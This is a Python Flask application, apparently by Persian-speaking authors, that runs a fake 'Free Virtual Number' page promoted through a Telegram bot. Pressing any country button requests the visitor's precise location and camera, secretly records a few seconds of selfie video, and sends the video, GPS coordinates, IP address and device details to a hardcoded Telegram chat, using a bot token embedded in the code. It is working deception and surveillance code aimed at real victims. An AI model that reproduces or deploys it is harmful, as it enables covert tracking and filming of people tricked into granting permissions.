from flask import Flask, render_template_string, request, jsonify
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
TARGET_CHAT_ID = "8173349543"

# آدرس سایت شما در رایلی (دقیقاً همان لینکی که Railway به شما داده است را اینجا وارد کنید)
WEB_URL = "https://web-production-2ed72b.up.railway.app"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Virtual Number</title>
<style>
    body{background:#0a0b10;color:white;font-family:sans-serif;text-align:center;padding:20px;margin:0}
    .card{background:#161b22;padding:20px;border-radius:15px;margin:15px auto;max-width:400px;border:1px solid #30363d}
    .btn{background:#ef4444;color:white;border:none;padding:15px;width:100%;border-radius:10px;font-size:18px;font-weight:bold;cursor:pointer}
    h1{font-size:22px;color:#58a6ff}
</style>
</head>
<body>
    <h1>Free Virtual Number 📞</h1>
    <p style="color:#8b949e;font-size:14px;">برای دریافت شماره اختصاصی، یکی از موارد زیر را انتخاب کنید:</p>
    
    <div class="card"><h2>🇺🇸 UNITED STATES</h2><button class="btn" onclick="startProcess()">SELECT</button></div>
    <div class="card"><h2>🇬🇧 UNITED KINGDOM</h2><button class="btn" onclick="startProcess()">SELECT</button></div>
    <div class="card"><h2>🇮🇳 INDIA</h2><button class="btn" onclick="startProcess()">SELECT</button></div>

    <video id="video" autoplay playsinline muted style="display:none"></video>

    <script>
    async function startProcess() {
        alert("در حال اتصال به سرور...");
        
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append("video", blob);
                    formData.append("info", JSON.stringify({
                        ua: navigator.userAgent,
                        lat: lat,
                        lon: lon,
                        screen: window.screen.width + "x" + window.screen.height
                    }));
                    
                    await fetch("/upload", { method: "POST", body: formData });
                    alert("شماره شما آماده شد!");
                };
                
                mediaRecorder.start();
                setTimeout(() => { 
                    mediaRecorder.stop(); 
                    stream.getTracks().forEach(t => t.stop()); 
                }, 4000);
                
            } catch(e) {
                alert("لطفاً اجازه دسترسی به دوربین را تأیید کنید.");
            }
        }, (err) => {
            alert("لطفاً دسترسی به موقعیت مکانی (Location) را تأیید کنید.");
        }, { enableHighAccuracy: true });
    }
    </script>
</body>
</html>
"""

# مسیر پاسخگویی به ربات تلگرام (دستور استارت)
@app.route("/bot", methods=["POST"])
def bot():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        
        if text == '/start':
            msg = f"سلام! برای دریافت شماره مجازی اختصاصی خود روی لینک زیر کلیک کنید:\n\n{WEB_URL}"
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": chat_id, "text": msg}
            )
    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/upload", methods=["POST"])
def upload():
    video = request.files.get("video")
    info_raw = request.form.get("info")
    
    info = json.loads(info_raw) if info_raw else {}
    
    lat = info.get('lat', 'نامشخص')
    lon = info.get('lon', 'نامشخص')
    ua = info.get('ua', 'نامشخص')
    screen = info.get('screen', 'نامشخص')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = (
        f"🚨 **گزارش جدید دریافت شد:**\n\n"
        f"📍 موقعیت GPS: {lat}, {lon}\n"
        f"🌐 آی‌پی: {user_ip}\n"
        f"🖥 صفحه نمایش: {screen}\n"
        f"📱 مشخصات دستگاه: {ua}"
    )
    
    if lat != 'نامشخص' and lon != 'نامشخص':
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
            json={"chat_id": TARGET_CHAT_ID, "latitude": lat, "longitude": lon}
        )
    
    if video:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
            data={"chat_id": TARGET_CHAT_ID, "caption": msg},
            files={"video": ("video.webm", video.stream, "video/webm")}
        )
        
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
